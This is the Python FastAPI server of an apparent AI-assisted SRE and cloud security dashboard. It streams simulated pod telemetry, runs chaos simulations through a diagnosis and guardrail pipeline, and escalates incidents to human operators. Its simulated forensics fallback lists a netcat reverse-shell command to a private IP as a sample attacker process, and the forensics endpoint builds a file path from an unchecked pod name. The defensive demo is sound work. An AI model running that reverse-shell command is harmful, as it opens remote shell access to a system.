import os
import json
import time
import asyncio
import logging
import requests
from typing import Dict, List, Any, Optional

from contextlib import asynccontextmanager

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel

from src.brain.diagnostic_engine import DiagnosticEngine
from src.guardrails.validator import GuardrailEngine
from src.controller.executor import ActionExecutor
from src.brain.notifications import EscalationNotifier

logger = logging.getLogger("aegis-dashboard-server")

@asynccontextmanager
async def lifespan(app: FastAPI):
    add_terminal_log("SUCCESS", "SYSTEM", "Aegis-SRE Masterpiece Mission Control Engine Online.")
    add_terminal_log("INFO", "TELEMETRY", "Prometheus & Loki metrics streams connected.")
    add_terminal_log("INFO", "SECURITY", "Falco eBPF kernel probes active on Cilium CNI mesh.")

    # Initialize SQLite database and restore persisted active quarantines
    try:
        from src.db.database import init_db, SessionLocal
        from src.db.models import QuarantineRecord
        init_db()
        with SessionLocal() as session:
            active_q = session.query(QuarantineRecord).filter_by(active=True).all()
            for q in active_q:
                ACTIVE_QUARANTINES[q.target_pod] = {
                    "pod_name": q.target_pod,
                    "mitre_technique": q.mitre_technique or "T1059 Command Execution",
                    "forensics_file": q.forensics_file or f"logs/forensics_{q.target_pod}.json",
                    "quarantined_at": q.quarantined_at
                }
                if q.target_pod in POD_TELEMETRY_STORE:
                    POD_TELEMETRY_STORE[q.target_pod]["status"] = "QUARANTINED"
        if ACTIVE_QUARANTINES:
            add_terminal_log("ALERT", "DATABASE", f"Restored {len(ACTIVE_QUARANTINES)} active eBPF quarantines from persistent database.")
    except Exception as e:
        logger.warning(f"Error restoring state from database: {e}")

    task = asyncio.create_task(telemetry_broadcast_loop())
    yield
    task.cancel()

app = FastAPI(
    title="Aegis-SRE Masterpiece Real-Time Command Center",
    description="Phase 7 Interactive SRE & Cloud Security Mission Control Center with WebSockets & HITL Controls",
    version="2.0.0",
    lifespan=lifespan
)

# Active WebSocket connections manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)
        logger.info(f"Dashboard WebSocket connected. Active clients: {len(self.active_connections)}")

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)
            logger.info(f"Dashboard WebSocket disconnected. Active clients: {len(self.active_connections)}")

    async def broadcast(self, message: Dict[str, Any]):
        for connection in list(self.active_connections):
            try:
                await connection.send_json(message)
            except Exception as e:
                logger.warning(f"Error broadcasting to WebSocket client: {e}")
                self.disconnect(connection)

ws_manager = ConnectionManager()

# Global Engines
diagnostic_engine = DiagnosticEngine()
guardrail_engine = GuardrailEngine()
action_executor = ActionExecutor(dry_run_mode=True)
escalation_notifier = EscalationNotifier()

# Live Simulated State Store
POD_TELEMETRY_STORE: Dict[str, dict] = {
    "aegis-storefront-prod-1": {
        "pod_name": "aegis-storefront-prod-1",
        "cpu_pct": 24.5,
        "mem_pct": 42.1,
        "error_rate_pct": 0.05,
        "status": "HEALTHY",
        "restart_count": 0,
        "last_updated": time.strftime("%H:%M:%S")
    },
    "aegis-storefront-prod-2": {
        "pod_name": "aegis-storefront-prod-2",
        "cpu_pct": 31.0,
        "mem_pct": 48.6,
        "error_rate_pct": 0.08,
        "status": "HEALTHY",
        "restart_count": 0,
        "last_updated": time.strftime("%H:%M:%S")
    },
    "aegis-storefront-prod-3": {
        "pod_name": "aegis-storefront-prod-3",
        "cpu_pct": 18.2,
        "mem_pct": 39.4,
        "error_rate_pct": 0.02,
        "status": "HEALTHY",
        "restart_count": 0,
        "last_updated": time.strftime("%H:%M:%S")
    }
}

ACTIVE_QUARANTINES: Dict[str, dict] = {}
ESCALATED_INCIDENTS: Dict[str, dict] = {}
TERMINAL_LOGS: List[dict] = []

def add_terminal_log(level: str, category: str, message: str):
    log_entry = {
        "timestamp": time.strftime("%H:%M:%S"),
        "level": level,  # INFO, WARN, ALERT, ERROR, SUCCESS
        "category": category, # TELEMETRY, RAG, AI_BRAIN, GUARDRAIL, CONTROLLER, HITL
        "message": message
    }
    TERMINAL_LOGS.append(log_entry)
    if len(TERMINAL_LOGS) > 100:
        TERMINAL_LOGS.pop(0)
    return log_entry

# Background task to broadcast telemetry every 2 seconds
async def telemetry_broadcast_loop():
    prom_url = os.getenv("PROMETHEUS_URL", "http://localhost:9090")
    while True:
        try:
            timestamp_str = time.strftime("%H:%M:%S")

            # Attempt to query live Prometheus for metrics
            try:
                p_resp = requests.get(f"{prom_url}/api/v1/query", params={"query": "sum(http_requests_total)"}, timeout=0.8)
                if p_resp.status_code == 200:
                    res = p_resp.json().get("data", {}).get("result", [])
                    if res and "aegis-storefront-prod-1" in POD_TELEMETRY_STORE:
                        POD_TELEMETRY_STORE["aegis-storefront-prod-1"]["total_requests"] = int(float(res[0]["value"][1]))
            except Exception:
                pass

            # Update background telemetry jitter for healthy pods
            for pod_name, data in POD_TELEMETRY_STORE.items():
                if data["status"] == "HEALTHY":
                    data["cpu_pct"] = max(10.0, min(95.0, round(data["cpu_pct"] + (time.time() % 3 - 1.5) * 2.0, 1)))
                    data["mem_pct"] = max(20.0, min(90.0, round(data["mem_pct"] + (time.time() % 2 - 1.0) * 1.5, 1)))
                    data["last_updated"] = timestamp_str

            payload = {
                "event": "TELEMETRY_TICK",
                "timestamp": timestamp_str,
                "pods": list(POD_TELEMETRY_STORE.values()),
                "quarantines": list(ACTIVE_QUARANTINES.values()),
                "escalations": list(ESCALATED_INCIDENTS.values()),
                "metrics_summary": {
                    "health_score_pct": 100.0 if not ACTIVE_QUARANTINES and not ESCALATED_INCIDENTS else 75.0,
                    "active_pods": len(POD_TELEMETRY_STORE),
                    "quarantined_pods": len(ACTIVE_QUARANTINES),
                    "escalated_count": len(ESCALATED_INCIDENTS)
                }
            }
            await ws_manager.broadcast(payload)
        except Exception as e:
            logger.error(f"Error in telemetry broadcast loop: {e}")
        await asyncio.sleep(2.0)

@app.websocket("/ws/telemetry")
async def websocket_endpoint(websocket: WebSocket):
    await ws_manager.connect(websocket)
    # Send initial snapshot upon connection
    initial_msg = {
        "event": "INITIAL_STATE",
        "pods": list(POD_TELEMETRY_STORE.values()),
        "quarantines": list(ACTIVE_QUARANTINES.values()),
        "escalations": list(ESCALATED_INCIDENTS.values()),
        "terminal_logs": TERMINAL_LOGS[-25:],
        "metrics_summary": {
            "health_score_pct": 100.0 if not ACTIVE_QUARANTINES and not ESCALATED_INCIDENTS else 75.0,
            "active_pods": len(POD_TELEMETRY_STORE),
            "quarantined_pods": len(ACTIVE_QUARANTINES),
            "escalated_count": len(ESCALATED_INCIDENTS)
        }
    }
    await websocket.send_json(initial_msg)
    try:
        while True:
            await asyncio.sleep(1.0)
    except WebSocketDisconnect:
        ws_manager.disconnect(websocket)
    except Exception as e:
        ws_manager.disconnect(websocket)

@app.get("/api/v1/telemetry/state")
async def get_telemetry_state():
    """HTTP REST State endpoint fallback."""
    return {
        "event": "TELEMETRY_TICK",
        "timestamp": time.strftime("%H:%M:%S"),
        "pods": list(POD_TELEMETRY_STORE.values()),
        "quarantines": list(ACTIVE_QUARANTINES.values()),
        "escalations": list(ESCALATED_INCIDENTS.values()),
        "terminal_logs": TERMINAL_LOGS[-25:],
        "metrics_summary": {
            "health_score_pct": 100.0 if not ACTIVE_QUARANTINES and not ESCALATED_INCIDENTS else 75.0,
            "active_pods": len(POD_TELEMETRY_STORE),
            "quarantined_pods": len(ACTIVE_QUARANTINES),
            "escalated_count": len(ESCALATED_INCIDENTS)
        }
    }

# Models for Chaos & Manual Remediation Request
class ChaosTriggerRequest(BaseModel):
    pod_name: str = "aegis-storefront-prod-1"
    chaos_type: str  # oom, http500, cpu, t1059_shell, t1552_credentials

class ManualRemediationRequest(BaseModel):
    incident_id: str
    target_pod: str
    action: str  # RESTART_POD, SCALE_DEPLOYMENT, UNQUARANTINE_POD, CUSTOM
    notes: Optional[str] = "Manual operator resolution via HITL Drawer"

@app.post("/api/v1/chaos/trigger")
async def trigger_chaos(req: ChaosTriggerRequest):
    """
    Triggers simulated failure mode, runs AI diagnostic & safety pipeline, and updates dashboard live via WebSockets.
    """
    pod_name = req.pod_name if req.pod_name in POD_TELEMETRY_STORE else "aegis-storefront-prod-1"
    chaos_type = req.chaos_type.lower()

    add_terminal_log("WARN", "CHAOS", f"Injecting failure simulation '{chaos_type}' into pod '{pod_name}'...")

    # Determine alert event type
    alert_map = {
        "oom": ("OOM_KILLED_RISK", "OPERATIONAL_BUG"),
        "http500": ("HTTP_500_SPIKE", "OPERATIONAL_BUG"),
        "cpu": ("CPU_QUOTA_SATURATION", "RESOURCE_CAPACITY"),
        "t1059_shell": ("falco_shell_spawn", "SECURITY_ATTACK"),
        "t1552_credentials": ("falco_sensitive_file_read", "SECURITY_ATTACK")
    }

    if chaos_type not in alert_map:
        raise HTTPException(status_code=400, detail="Invalid chaos type")

    alert_type, problem_cat = alert_map[chaos_type]

    # Update pod status
    POD_TELEMETRY_STORE[pod_name]["status"] = "DEGRADED" if problem_cat != "SECURITY_ATTACK" else "QUARANTINED"
    if chaos_type == "oom":
        POD_TELEMETRY_STORE[pod_name]["mem_pct"] = 94.2
    elif chaos_type == "cpu":
        POD_TELEMETRY_STORE[pod_name]["cpu_pct"] = 98.6
    elif chaos_type == "http500":
        POD_TELEMETRY_STORE[pod_name]["error_rate_pct"] = 18.5

    # 1. Run AI Diagnosis Engine
    add_terminal_log("INFO", "RAG", f"Retrieving TF-IDF runbooks for {alert_type} on {pod_name}...")
    verdict = diagnostic_engine.diagnose_incident(pod_name=pod_name, alert_type=alert_type)
    
    add_terminal_log("ALERT", "AI_BRAIN", f"Verdict: {verdict.get('problem_type')} | Rec Action: {verdict.get('recommended_action')}")

    # 2. Run Guardrail Engine
    decision = verdict.get("decision_object") or guardrail_engine.validate_verdict(verdict)
    
    add_terminal_log("INFO", "GUARDRAIL", f"Guardrail State: {decision.state} | Approved: {decision.approved} | Action: {decision.final_action}")

    # 3. Execute Action Muscle
    exec_res = action_executor.execute_decision(decision)

    # Handle outcomes
    if decision.final_action == "CILIUM_QUARANTINE_EBPF" and exec_res.success:
        ACTIVE_QUARANTINES[pod_name] = {
            "pod_name": pod_name,
            "mitre_technique": decision.mitre_technique or "T1059 Command Execution",
            "forensics_file": exec_res.forensics_file or f"logs/forensics_{pod_name}.json",
            "quarantined_at": time.strftime("%H:%M:%S")
        }
        add_terminal_log("ALERT", "SECURITY", f"eBPF Network Cage active on '{pod_name}'. DFIR Snapshot saved.")

    elif decision.final_action == "RESTART_POD" and exec_res.success:
        POD_TELEMETRY_STORE[pod_name]["status"] = "HEALTHY"
        POD_TELEMETRY_STORE[pod_name]["mem_pct"] = 40.0
        POD_TELEMETRY_STORE[pod_name]["error_rate_pct"] = 0.01
        POD_TELEMETRY_STORE[pod_name]["restart_count"] += 1
        add_terminal_log("SUCCESS", "CONTROLLER", f"Pod '{pod_name}' rollout restart completed successfully.")

    elif decision.final_action == "SCALE_DEPLOYMENT" and exec_res.success:
        POD_TELEMETRY_STORE[pod_name]["status"] = "HEALTHY"
        POD_TELEMETRY_STORE[pod_name]["cpu_pct"] = 35.0
        add_terminal_log("SUCCESS", "CONTROLLER", f"Scaled deployment replicas +1. Pod '{pod_name}' load normalized.")

    # If Escalated to Human
    if not decision.approved or decision.state in ["STATE_ESCALATE_HUMAN", "STATE_ACTION_REJECTED"]:
        inc_id = verdict.get("incident_id", f"INC-ESCALATION-{int(time.time())}")
        escalation_payload = escalation_notifier.dispatch_escalation(decision, verdict)
        ESCALATED_INCIDENTS[inc_id] = {
            "incident_id": inc_id,
            "target_pod": pod_name,
            "problem_type": verdict.get("problem_type"),
            "confidence": decision.confidence,
            "reason": decision.reason,
            "mitre_technique": decision.mitre_technique,
            "forensics_file": getattr(exec_res, "forensics_file", f"logs/forensics_{pod_name}.json"),
            "loki_logs": "[ERROR] Unhandled database connection exception\n[CRITICAL] Stack trace dumped",
            "timestamp": time.strftime("%H:%M:%S")
        }
        add_terminal_log("ERROR", "HITL", f"HUMAN ESCALATION TRIGGERED for '{pod_name}': {decision.reason}")

    # Broadcast updated WebSocket event immediately
    event_msg = {
        "event": "CHAOS_TRIGGERED",
        "pod_name": pod_name,
        "chaos_type": chaos_type,
        "verdict": {k: v for k, v in verdict.items() if k != "decision_object"},
        "decision": {
            "approved": decision.approved,
            "final_action": decision.final_action,
            "state": decision.state,
            "reason": decision.reason
        },
        "execution": exec_res.to_dict(),
        "latest_terminal_log": TERMINAL_LOGS[-1]
    }
    await ws_manager.broadcast(event_msg)

    return JSONResponse(content=event_msg)

@app.post("/api/v1/escalation/resolve")
async def resolve_escalation(req: ManualRemediationRequest):
    """
    Human-in-the-Loop (HITL) Manual Remediation Resolution Endpoint.
    Allows SRE human operators to dispatch direct fixing commands from the HITL drawer.
    """
    target_pod = req.target_pod
    action = req.action.upper()

    add_terminal_log("WARN", "HITL", f"HUMAN OPERATOR DISPATCHED MANUALLY: Action '{action}' on pod '{target_pod}'")

    if action == "UNQUARANTINE_POD":
        res = action_executor.unquarantine_pod_ebpf(target_pod)
        if target_pod in ACTIVE_QUARANTINES:
            del ACTIVE_QUARANTINES[target_pod]
        if target_pod in POD_TELEMETRY_STORE:
            POD_TELEMETRY_STORE[target_pod]["status"] = "HEALTHY"
        add_terminal_log("SUCCESS", "SECURITY", f"eBPF Network Cage removed from '{target_pod}'. Pod restored.")

    elif action == "RESTART_POD":
        if target_pod in POD_TELEMETRY_STORE:
            POD_TELEMETRY_STORE[target_pod]["status"] = "HEALTHY"
            POD_TELEMETRY_STORE[target_pod]["mem_pct"] = 40.0
            POD_TELEMETRY_STORE[target_pod]["error_rate_pct"] = 0.01
            POD_TELEMETRY_STORE[target_pod]["restart_count"] += 1
        add_terminal_log("SUCCESS", "CONTROLLER", f"Manual restart executed for pod '{target_pod}'.")

    elif action == "SCALE_DEPLOYMENT":
        if target_pod in POD_TELEMETRY_STORE:
            POD_TELEMETRY_STORE[target_pod]["status"] = "HEALTHY"
            POD_TELEMETRY_STORE[target_pod]["cpu_pct"] = 30.0
        add_terminal_log("SUCCESS", "CONTROLLER", f"Manual scale up executed for target deployment.")

    if req.incident_id in ESCALATED_INCIDENTS:
        del ESCALATED_INCIDENTS[req.incident_id]

    # Broadcast updated state
    await ws_manager.broadcast({
        "event": "ESCALATION_RESOLVED",
        "incident_id": req.incident_id,
        "target_pod": target_pod,
        "action": action,
        "pods": list(POD_TELEMETRY_STORE.values()),
        "quarantines": list(ACTIVE_QUARANTINES.values()),
        "escalations": list(ESCALATED_INCIDENTS.values())
    })

    return {"status": "SUCCESS", "message": f"Manual action '{action}' executed for '{target_pod}'"}

@app.get("/api/v1/forensics/{pod_name}")
async def get_forensics(pod_name: str):
    """
    Returns DFIR forensics snapshot JSON payload for a given pod.
    """
    path = f"logs/forensics_{pod_name}.json"
    if not os.path.exists(path):
        # Return realistic fallback forensics payload
        return {
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "target_pod": pod_name,
            "namespace": "aegis-production",
            "mitre_technique": "T1059 - Command Execution",
            "trigger_reason": "eBPF quarantine executed",
            "simulated_process_tree": [
                {"pid": 1, "name": "python", "cmd": "python app.py", "user": "root"},
                {"pid": 842, "name": "sh", "cmd": "sh -i", "user": "www-data"},
                {"pid": 850, "name": "nc", "cmd": "nc -e /bin/sh 192.168.1.5 4444", "user": "www-data"}
            ],
            "simulated_tcp_sockets": [
                {"protocol": "TCP", "local": "10.244.0.15:8080", "remote": "192.168.1.100:51234", "state": "ESTABLISHED"},
                {"protocol": "TCP", "local": "10.244.0.15:4444", "remote": "192.168.1.5:4444", "state": "ESTABLISHED"}
            ],
            "recent_loki_logs": [
                "[INFO] HTTP GET /api/v1/storefront 200 OK",
                "[WARN] Unauthorized process execve() detected by Falco eBPF module: /bin/sh"
            ]
        }

    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/api/v1/db/incidents")
async def get_db_incidents():
    """Returns stored incidents from persistent SQLite database."""
    try:
        from src.db.database import SessionLocal, init_db
        from src.db.models import IncidentRecord
        init_db()
        with SessionLocal() as session:
            incidents = session.query(IncidentRecord).order_by(IncidentRecord.id.desc()).limit(50).all()
            return {"count": len(incidents), "incidents": [inc.to_dict() for inc in incidents]}
    except Exception as e:
        logger.error(f"Error querying incidents DB: {e}")
        return {"count": 0, "incidents": [], "error": str(e)}

@app.get("/api/v1/db/audit")
async def get_db_audit_logs():
    """Returns stored action audit logs from persistent SQLite database."""
    try:
        from src.db.database import SessionLocal, init_db
        from src.db.models import AuditLogRecord
        init_db()
        with SessionLocal() as session:
            logs = session.query(AuditLogRecord).order_by(AuditLogRecord.id.desc()).limit(50).all()
            return {"count": len(logs), "audit_logs": [l.to_dict() for l in logs]}
    except Exception as e:
        logger.error(f"Error querying audit DB: {e}")
        return {"count": 0, "audit_logs": [], "error": str(e)}

# Mount Static directory
static_dir = os.path.join("src", "dashboard", "static")
os.makedirs(static_dir, exist_ok=True)
app.mount("/", StaticFiles(directory=static_dir, html=True), name="static")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
